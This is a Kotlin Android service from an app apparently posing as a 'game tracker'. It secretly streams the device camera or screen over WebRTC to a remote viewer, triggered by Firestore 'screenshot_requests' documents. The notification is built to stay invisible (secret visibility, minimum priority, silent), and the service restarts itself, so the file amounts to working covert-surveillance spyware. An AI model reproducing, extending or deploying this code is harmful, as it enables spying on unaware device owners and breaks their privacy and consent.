package com.example.game_tracker

import android.app.Service
import android.content.Intent
import android.media.projection.MediaProjection
import android.os.IBinder
import androidx.core.app.NotificationCompat
import org.webrtc.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.ListenerRegistration
import java.util.*

class WebRtcPublisherService : Service() {
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var localVideoTrack: VideoTrack? = null
    private var videoCapturer: VideoCapturer? = null
    private val firestore = FirebaseFirestore.getInstance()
    private var requestId: String? = null
    private var docListener: ListenerRegistration? = null
    private var iceListener: ListenerRegistration? = null

    override fun onCreate() {
        super.onCreate()
        val notification = createNotification()
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(
                ForegroundService.NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(ForegroundService.NOTIFICATION_ID, notification)
        }
        initializePeerFactory()
    }

    private fun createNotification() = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
        .setSmallIcon(R.mipmap.ic_launcher)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .setOngoing(true)
        .setSilent(true)
        .setLocalOnly(true)
        .build()

    private fun initializePeerFactory() {
        val options = PeerConnectionFactory.InitializationOptions.builder(this).createInitializationOptions()
        PeerConnectionFactory.initialize(options)
        val encoderFactory = DefaultVideoEncoderFactory(EglBase.create().eglBaseContext, true, true)
        val decoderFactory = DefaultVideoDecoderFactory(EglBase.create().eglBaseContext)
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .createPeerConnectionFactory()
    }

    private fun createPeerConnection() {
        val iceServers = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                requestId?.let { rid ->
                    firestore.collection("screenshot_requests").document(rid).collection("iceCandidates")
                        .add(mapOf(
                            "candidate" to candidate.sdp,
                            "sdpMid" to candidate.sdpMid,
                            "sdpMLineIndex" to candidate.sdpMLineIndex,
                            "from" to "publisher"
                        ))
                }
            }
            override fun onAddStream(stream: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onIceConnectionReceivingChange(p0: Boolean) {}
            override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {}
            override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
            override fun onRemoveStream(p0: MediaStream?) {}
            override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
            override fun onIceCandidatesRemoved(p0: Array<out IceCandidate>?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
        })
    }

    private fun watchForAnswerAndRemoteIce(rid: String) {
        docListener = firestore.collection("screenshot_requests").document(rid)
            .addSnapshotListener { snapshot: DocumentSnapshot?, error ->
                if (error != null || snapshot == null) return@addSnapshotListener
                if (snapshot.contains("answer")) {
                    val answer = snapshot.get("answer") as? Map<*, *>
                    val sdp = answer?.get("sdp") as? String
                    val type = answer?.get("type") as? String
                    if (!sdp.isNullOrEmpty() && !type.isNullOrEmpty()) {
                        val sd = SessionDescription(SessionDescription.Type.fromCanonicalForm(type), sdp)
                        peerConnection?.setRemoteDescription(object : SdpObserver {
                            override fun onSetSuccess() {}
                            override fun onSetFailure(p0: String?) {}
                            override fun onCreateSuccess(p0: SessionDescription?) {}
                            override fun onCreateFailure(p0: String?) {}
                        }, sd)
                    }
                }
            }

        // Listen for ICE candidates from admin / viewer (filtering out publisher's own candidates)
        iceListener = firestore.collection("screenshot_requests").document(rid)
            .collection("iceCandidates")
            .addSnapshotListener { snapshots: com.google.firebase.firestore.QuerySnapshot?, error: com.google.firebase.firestore.FirebaseFirestoreException? ->
                if (error != null || snapshots == null) return@addSnapshotListener
                for (doc in snapshots.documentChanges) {
                    val data = doc.document.data
                    val from = data["from"] as? String
                    if (from == "publisher") continue

                    val candidate = data["candidate"] as? String
                    val sdpMid = data["sdpMid"] as? String
                    val sdpMLineIndex = (data["sdpMLineIndex"] as? Long)?.toInt() ?: (data["sdpMLineIndex"] as? Int ?: 0)
                    if (candidate != null && sdpMid != null) {
                        peerConnection?.addIceCandidate(IceCandidate(sdpMid, sdpMLineIndex, candidate))
                    }
                }
            }
    }

    private fun startLocalCapture(requestType: String, facing: String, resultData: Intent?) {
        if (requestType == "screen_share" && resultData != null) {
            try {
                videoCapturer = ScreenCapturerAndroid(resultData, object : MediaProjection.Callback() {})
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        if (videoCapturer == null) {
            val enumerator = Camera2Enumerator(this)
            val deviceNames = enumerator.deviceNames
            var chosenName: String? = null
            for (name in deviceNames) {
                val isFront = enumerator.isFrontFacing(name)
                if ((facing == "front" && isFront) || (facing == "back" && !isFront)) {
                    chosenName = name
                    break
                }
            }
            val targetName = chosenName ?: if (deviceNames.isNotEmpty()) deviceNames[0] else null
            if (targetName != null) {
                videoCapturer = enumerator.createCapturer(targetName, null)
            }
        }

        val eglBase = EglBase.create()
        val surfaceTextureHelper = SurfaceTextureHelper.create("WebRTC_Thread", eglBase.eglBaseContext)
        val videoSource = peerConnectionFactory?.createVideoSource(false)
        videoCapturer?.initialize(surfaceTextureHelper, applicationContext, videoSource?.capturerObserver)
        videoCapturer?.startCapture(640, 480, 25)
        localVideoTrack = peerConnectionFactory?.createVideoTrack("ARDAMSv0", videoSource)
        peerConnection?.addTrack(localVideoTrack)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        requestId = intent?.getStringExtra("requestId")
        val cameraFacing = intent?.getStringExtra("cameraFacing") ?: "front"
        val requestType = intent?.getStringExtra("requestType") ?: "camera_stream"
        val resultDataFromIntent = intent?.getParcelableExtra<Intent>("resultData")
        val resultData = resultDataFromIntent ?: MainActivity.mediaProjectionResultData

        createPeerConnection()
        startLocalCapture(requestType, cameraFacing, resultData)

        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(desc: SessionDescription?) {
                peerConnection?.setLocalDescription(object : SdpObserver {
                    override fun onSetSuccess() {}
                    override fun onSetFailure(p0: String?) {}
                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, desc)

                requestId?.let { rid ->
                    firestore.collection("screenshot_requests").document(rid).set(mapOf(
                        "offer" to mapOf(
                            "sdp" to desc?.description,
                            "type" to desc?.type?.canonicalForm()
                        ),
                        "status" to "offer_created"
                    ), com.google.firebase.firestore.SetOptions.merge())

                    watchForAnswerAndRemoteIce(rid)
                }
            }
            override fun onCreateFailure(p0: String?) {}
            override fun onSetSuccess() {}
            override fun onSetFailure(p0: String?) {}
        }, MediaConstraints())

        return START_STICKY
    }

    override fun onDestroy() {
        try {
            videoCapturer?.stopCapture()
        } catch (e: Exception) {}
        try {
            docListener?.remove()
        } catch (e: Exception) {}
        try {
            iceListener?.remove()
        } catch (e: Exception) {}

        peerConnection?.close()
        peerConnectionFactory?.dispose()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
